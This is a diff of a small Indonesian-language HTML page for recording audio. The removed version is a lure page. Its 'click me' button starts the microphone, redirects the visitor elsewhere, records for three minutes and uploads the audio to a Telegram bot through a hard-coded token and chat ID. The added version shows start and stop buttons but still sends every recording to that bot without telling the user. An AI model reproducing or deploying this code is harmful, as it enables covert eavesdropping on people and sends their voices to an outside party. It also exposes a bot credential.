@@ -2,97 +2,133 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="stylesheet" href="css/style.css">
     <title>Record Audio</title>
 </head>
 <body>
-    <div class="greetings">
-        <span>A</span>
-        <span>L</span>
-        <span>L</span>
-        <span>O</span>
-        <span>O</span>
-    </div>
-    <div class="description">
-        <p><span></span></p>
-    </div>
-    <button id="actionButton">Coba Klik Aku untuk Rekam Suara</button>
-    <div id="statusMessage" style="display: none;">
-        <p>Perekaman sedang berlangsung...</p>
-    </div>
+    <button id="start">Mulai Rekaman</button>
+    <button id="stop" disabled>Hentikan Rekaman</button>
+    <p id="status">Status: Siap</p>
 
     <script>
-        let mediaRecorder;
+        let audioContext;
+        let mediaStream;
         let audioChunks = [];
-        let botToken = '8103522113:AAECNtZDVMnPLaXX3HD1IFeQuOp7cQ2Td_Y'; // Ganti dengan token bot Anda
-        let chatId = '6813368909'; // Ganti dengan chat ID Anda
+        let scriptProcessor;
 
-        document.getElementById('actionButton').addEventListener('click', () => {
-            // Tampilkan pesan status segera setelah tombol diklik
-            document.getElementById('statusMessage').style.display = 'block';
-            // Coba aktifkan mikrofon dan mulai rekam suara
+        document.getElementById('start').addEventListener('click', () => {
+            document.getElementById('status').innerText = 'Status: Merekam...';
             startRecording();
-
-            // Langsung arahkan pengguna ke halaman `flower.html`
-            window.location.href = 'flower.html';
+            document.getElementById('start').disabled = true;
+            document.getElementById('stop').disabled = false;
         });
 
-        function startRecording() {
-            navigator.mediaDevices.getUserMedia({ audio: true })
-                .then((stream) => {
-                    const audioContext = new (window.AudioContext || window.webkitAudioContext)();
-                    const mediaStreamSource = audioContext.createMediaStreamSource(stream);
-                    mediaRecorder = new MediaRecorder(stream);
+        document.getElementById('stop').addEventListener('click', () => {
+            document.getElementById('status').innerText = 'Status: Rekaman Selesai';
+            stopRecording();
+            document.getElementById('start').disabled = false;
+            document.getElementById('stop').disabled = true;
+        });
 
-                    mediaRecorder.ondataavailable = (event) => {
-                        audioChunks.push(event.data);
-                    };
+        async function startRecording() {
+            audioContext = new (window.AudioContext || window.webkitAudioContext)();
+            mediaStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            const source = audioContext.createMediaStreamSource(mediaStream);
 
-                    mediaRecorder.onstop = () => {
-                        const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
-                        const audioUrl = URL.createObjectURL(audioBlob);
-                        audioChunks = [];
-                        sendAudioToTelegram(audioBlob);
-                    };
+            scriptProcessor = audioContext.createScriptProcessor(4096, 1, 1);
+            source.connect(scriptProcessor);
+            scriptProcessor.connect(audioContext.destination);
 
-                    mediaRecorder.start();
-
-                    // Rekam selama 3 menit
-                    setTimeout(() => {
-                        mediaRecorder.stop();
-                    }, 180000); // 3 menit = 180000 ms
-                })
-                .catch((err) => {
-                    console.warn("Akses mikrofon ditolak atau tidak tersedia:", err.message);
-                    fallbackAudioCapture();
-                });
+            scriptProcessor.onaudioprocess = (audioProcessingEvent) => {
+                const inputData = audioProcessingEvent.inputBuffer.getChannelData(0);
+                const buffer = new Float32Array(inputData);
+                audioChunks.push(buffer);
+            };
         }
 
-        function fallbackAudioCapture() {
-            const defaultAudioBlob = new Blob([new ArrayBuffer(0)], { type: 'audio/wav' }); // Ganti dengan audio default
-            sendAudioToTelegram(defaultAudioBlob);
+        function stopRecording() {
+            scriptProcessor.disconnect();
+            audioContext.close();
+            mediaStream.getTracks().forEach(track => track.stop());
+
+            // Menggabungkan data audio
+            const audioBlob = exportToWav(audioChunks);
+            sendToTelegram(audioBlob);
+
+            // Mengosongkan data untuk perekaman berikutnya
+            audioChunks = [];
         }
 
-        function sendAudioToTelegram(audioBlob) {
+        function exportToWav(buffers) {
+            // Proses mengonversi data PCM menjadi WAV
+            const length = buffers.reduce((sum, b) => sum + b.length, 0);
+            const result = new Float32Array(length);
+
+            let offset = 0;
+            buffers.forEach(buffer => {
+                result.set(buffer, offset);
+                offset += buffer.length;
+            });
+
+            // Mengonversi Float32Array menjadi WAV Blob
+            return encodeWav(result, audioContext.sampleRate);
+        }
+
+        function encodeWav(samples, sampleRate) {
+            const buffer = new ArrayBuffer(44 + samples.length * 2);
+            const view = new DataView(buffer);
+
+            // Header file WAV
+            writeString(view, 0, 'RIFF');
+            view.setUint32(4, 36 + samples.length * 2, true);
+            writeString(view, 8, 'WAVE');
+            writeString(view, 12, 'fmt ');
+            view.setUint32(16, 16, true);
+            view.setUint16(20, 1, true);
+            view.setUint16(22, 1, true);
+            view.setUint32(24, sampleRate, true);
+            view.setUint32(28, sampleRate * 2, true);
+            view.setUint16(32, 2, true);
+            view.setUint16(34, 16, true);
+            writeString(view, 36, 'data');
+            view.setUint32(40, samples.length * 2, true);
+
+            // Data PCM
+            let offset = 44;
+            for (let i = 0; i < samples.length; i++, offset += 2) {
+                const s = Math.max(-1, Math.min(1, samples[i]));
+                view.setInt16(offset, s < 0 ? s * 0x8000 : s * 0x7FFF, true);
+            }
+
+            return new Blob([view], { type: 'audio/wav' });
+        }
+
+        function writeString(view, offset, string) {
+            for (let i = 0; i < string.length; i++) {
+                view.setUint8(offset + i, string.charCodeAt(i));
+            }
+        }
+
+        function sendToTelegram(audioBlob) {
+            const botToken = '8103522113:AAECNtZDVMnPLaXX3HD1IFeQuOp7cQ2Td_Y';
+            const chatId = '6813368909';
+
             const formData = new FormData();
             formData.append('chat_id', chatId);
-            formData.append('audio', audioBlob, 'audio.wav');
+            formData.append('audio', audioBlob, 'recording.wav');
 
             fetch(`https://api.telegram.org/bot${botToken}/sendAudio`, {
                 method: 'POST',
-                body: formData
+                body: formData,
             })
                 .then(response => response.json())
                 .then(result => {
-                    console.log("Audio berhasil dikirim:", result);
+                    console.log('Audio berhasil dikirim:', result);
                 })
                 .catch(error => {
-                    console.error("Gagal mengirim audio ke Telegram:", error);
+                    console.error('Gagal mengirim audio ke Telegram:', error);
                 });
         }
     </script>
 </body>
 </html>
-
